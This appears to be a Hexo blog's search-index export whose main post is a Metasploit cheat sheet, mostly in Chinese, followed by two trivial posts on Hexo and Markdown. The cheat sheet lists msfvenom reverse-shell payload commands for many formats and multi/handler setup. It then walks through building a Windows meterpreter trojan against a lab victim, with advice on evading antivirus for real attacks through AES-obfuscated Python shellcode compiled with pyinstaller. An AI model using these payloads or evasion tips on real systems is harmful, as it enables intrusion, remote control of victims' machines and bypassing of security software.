href="post/Metasploit1#ASP"></a></h5><p><font face="Arial">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f asp &gt; shell.asp</your></your></font></p><h5 id="JSP">JSP<a href="post/Metasploit1#JSP"></a></h5><p><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.jsp</your></your></font></p><h5 id="WAR">WAR<a href="post/Metasploit1#WAR"></a></h5><p><font face="Arial">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f war &gt; shell.war                    Scripting Payloads</your></your></font></p><h5 id="Python">Python<a href="post/Metasploit1#Python"></a></h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_python LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.py</your></your></font></p><h5 id="Bash">Bash<a href="post/Metasploit1#Bash"></a></h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_bash LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.sh</your></your></font></p><h5 id="Perl">Perl<a href="post/Metasploit1#Perl"></a></h5><p><font face="Arial">msfvenom -p cmd/unix/reverse_perl LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.pl</your></your></font></p><h5 id="Shellcode">Shellcode<a href="post/Metasploit1#Shellcode"></a></h5><p><font face="Arial">For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</font></p><h5 id="Linux-Based-Shellcode">Linux Based Shellcode<a href="post/Metasploit1#Linux-Based-Shellcode"></a></h5><p><font face="Arial">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f <language></language></your></your></font></p><h5 id="Windows-Based-Shellcode">Windows Based Shellcode<a href="post/Metasploit1#Windows-Based-Shellcode"></a></h5><p>Your IP Address&gt; LPORT=<your port to connect on> -f  language    “language放在&lt;&gt;里”<br></your></p><h5 id="Mac-Based-Shellcode">Mac Based Shellcode<a href="post/Metasploit1#Mac-Based-Shellcode"></a></h5><p><font face="Arial">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f <language></language></your></your></font></p><h5 id="Handlers模块"><font face="Arial">Handlers模块</font><a href="post/Metasploit1#Handlers模块"></a></h5><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p><blockquote><p><font face="Arial">use exploit/multi/handler</font><br> <font face="Arial">set LHOST <lhost value></lhost></font><br> <font face="Arial">set LPORT <lport value></lport></font><br> <font face="Arial">exploit -j -z</font><br> <font face="Arial">Once the required values are completed the following command will </font>execute your handler – ‘msfconsole -L -r ‘</p></blockquote><hr><p>&nbsp;<br>&nbsp;<br><strong>下面以一个实例说明使用方法</strong></p><p>Metasploit之我的远程控制软件<br>参考文献：<a href="http://www.evil0x.com/posts/838.html" target="_blank" rel="noopener">Metasploit渗透测试笔记(Meterpreter篇</a></p><p>远程控制软件–&gt;远控后门木马程序</p><p>木马程序–&gt;控制端（攻击者）–&gt;服务端（攻击目标）</p><p>测试环境：<br>攻击者：kali-linux    –&gt;192.168.2.146<br>受害者：Windows07     –&gt;192.168.2.107</p><p>以下为kali-linux-2.0系统下的生成与连接方式（使用msfvenom命令的）<br><a href="http://www.77169.com/hack/201602/224112.shtm" target="_blank" rel="noopener">参考文献一</a><br><a href="http://www.i0day.com/1173.html" target="_blank" rel="noopener">类似文献二</a></p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的ip LPORT=你的端口 -f exe -o payload.exe</p><p>以上就是基本命令，解释一下，-p后面是payload名称，然后是你的ip和端口(payload参数)，然后是-f 格式，由于是实验就先设置exe，然后-o payload.exe指保存为payload.exe。当然，实验的时候可以把格式设置成exe，但是实战的时候毕竟有杀毒软件，所以格式最好是jar，jar就要求对方有java环境，可以用来拿java web网站的时候使用，或者设置成python然后自行shellcode免杀，即用Python容器，然后用AES混淆Python代码，再用pyinstaller编译exe，这是目前最完美的过杀毒软件方案，就连勒索软件都不会被杀毒软件干掉，除非有特殊动作，比如修改注册表。当然，楼主还有很多要学习。</p><p>具体步骤如下：</p><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>192.168.2.146 LPORT<span class="token operator">=</span>44444 -f exe -o test.exe            <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>–&gt;在当前目录下生成木马程序test.exe，PS：生成payload.exe不会被杀，test.exe被秒杀</p><p>PS:之后的操作步骤是和上面的一样的↓</p><p>之后在metasploit下连接后门程序，步骤如下：</p><pre class="line-numbers language-bash"><code class="language-bash">msfconsole                  --<span class="token operator">></span>开启metasploituse exploit/multi/handler       --<span class="token operator">></span>使用“exploit/multi/handler”这个模块连接后门程序show options   --<span class="token operator">></span>查看需要设置的配置信息//这里其实不需要配置任何信息的<span class="token keyword">set</span> PAYLOAD windows/meterpreter/reverse_tcp    --<span class="token operator">></span>使用tcp反向连接show options               --<span class="token operator">></span>查看需要设置的配置信息<span class="token keyword">set</span> LHOST<span class="token operator">=</span>192.168.2.146    --<span class="token operator">></span>设置我们攻击者自己的连接IP<span class="token keyword">set</span> LPORT<span class="token operator">=</span>44444            --<span class="token operator">></span>设置我们攻击浙自己的连接端口exploit                    --<span class="token operator">></span>执行连接，等待木马执行后连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PS：远程木马被执行后接着可以直接“shell”命令拿下shell</p><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>OK，完成了！<br>&nbsp;<br>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msfvenom </tag>
            
            <tag> 远程木马攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/post/hello-world/"/>
      <url>/post/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start">Quick Start<a href="post/hello-world#Quick-Start"></a></h2><h3 id="Create-a-new-post">Create a new post<a href="post/hello-world#Create-a-new-post"></a></h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server">Run server<a href="post/hello-world#Run-server"></a></h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files">Generate static files<a href="post/hello-world#Generate-static-files"></a></h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites<a href="post/hello-world#Deploy-to-remote-sites"></a></h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Markdown</title>
      <link href="/post/MarkdownUsage/"/>
      <url>/post/MarkdownUsage/</url>
      
        <content type="html"><![CDATA[<p><a href="http://marxi.co/" target="_blank" rel="noopener">1.Markdown在线编辑器</a></p><p><a href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown" target="_blank" rel="noopener">2.Markdown高级语法大全</a></p><p><a href="https://www.zybuluo.com/mdeditor" target="_blank" rel="noopener">3.Markdown高级语法</a></p><hr><hr>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
